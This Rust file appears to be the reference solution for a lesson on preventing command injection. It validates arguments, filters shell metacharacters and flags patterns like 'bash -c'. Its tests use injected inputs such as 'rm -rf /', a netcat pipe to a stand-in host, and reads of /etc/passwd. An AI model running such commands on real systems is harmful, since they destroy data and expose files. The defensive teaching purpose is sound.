//! # Lesson 03: Command Injection (Reference Solution)
//!
//! See the exercise file for full documentation and attack explanations.

const SHELL_META_CHARS: &[char] = &[
    ';', '|', '&', '$', '`', '(', ')', '{', '}', '[',
    ']', '#', '\n', '\r', '\\', '\'', '"', '>', '<', '!',
    '*', '?', '~', '\0',
];

pub fn contains_shell_metachars(input: &str) -> bool {
    input.chars().any(|c| SHELL_META_CHARS.contains(&c))
}

pub fn validate_command_argument(input: &str) -> Result<&str, String> {
    if input.is_empty() {
        return Err("Argument must not be empty".to_string());
    }

    if input.starts_with('-') {
        return Err("Argument must not start with a hyphen (flag injection)".to_string());
    }

    if input.contains('/') || input.contains('\\') {
        return Err("Argument must not contain path separators".to_string());
    }

    if input.contains('\0') {
        return Err("Argument must not contain null bytes".to_string());
    }

    if contains_shell_metachars(input) {
        return Err("Argument contains shell metacharacters".to_string());
    }

    if !input
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_' || c == ' ')
    {
        return Err("Argument contains disallowed characters".to_string());
    }

    Ok(input)
}

pub struct SafeCommand {
    program: String,
    args: Vec<String>,
}

impl SafeCommand {
    pub fn new(program: &str) -> Result<Self, String> {
        if program.is_empty() {
            return Err("Program name must not be empty".to_string());
        }
        if program.contains('/') || program.contains('\\') {
            return Err("Program name must not contain path separators".to_string());
        }
        if contains_shell_metachars(program) {
            return Err("Program name contains shell metacharacters".to_string());
        }
        Ok(Self {
            program: program.to_string(),
            args: Vec::new(),
        })
    }

    pub fn arg(mut self, arg: &str) -> Result<Self, String> {
        if contains_shell_metachars(arg) {
            return Err(format!("Argument contains shell metacharacters: '{}'", arg));
        }
        self.args.push(arg.to_string());
        Ok(self)
    }

    pub fn to_command_string(&self) -> String {
        let args: Vec<&str> = self.args.iter().map(|s| s.as_str()).collect();
        format!("{} {}", self.program, args.join(" "))
    }
}

pub fn detect_command_injection(input: &str) -> bool {
    if contains_shell_metachars(input) {
        return true;
    }

    let lower = input.to_lowercase();
    let dangerous_patterns = [
        "/bin/sh", "/bin/bash", "bash -c", "sh -c", "cmd.exe",
        "powershell", "eval ", "exec(",
    ];

    for pattern in &dangerous_patterns {
        if lower.contains(pattern) {
            return true;
        }
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_filename() {
        assert!(validate_command_argument("report.txt").is_ok());
    }

    #[test]
    fn test_reject_semicolon() {
        assert!(validate_command_argument("file.txt; rm -rf /").is_err());
    }

    #[test]
    fn test_reject_pipe() {
        assert!(validate_command_argument("file | nc evil 80").is_err());
    }

    #[test]
    fn test_reject_path_traversal() {
        assert!(validate_command_argument("../../etc/passwd").is_err());
    }

    #[test]
    fn test_reject_leading_hyphen() {
        assert!(validate_command_argument("-rf").is_err());
    }

    #[test]
    fn test_reject_null_byte() {
        assert!(validate_command_argument("file.txt\0.exe").is_err());
    }

    #[test]
    fn test_safe_command_basic() {
        let cmd = SafeCommand::new("cat").unwrap().arg("file.txt").unwrap();
        assert_eq!(cmd.to_command_string(), "cat file.txt");
    }

    #[test]
    fn test_safe_command_rejects_shell_metachar() {
        let result = SafeCommand::new("cat")
            .unwrap()
            .arg("file.txt; echo pwned");
        assert!(result.is_err());
    }

    #[test]
    fn test_detect_injection_subshell() {
        assert!(detect_command_injection("$(cat /etc/passwd)"));
    }
}
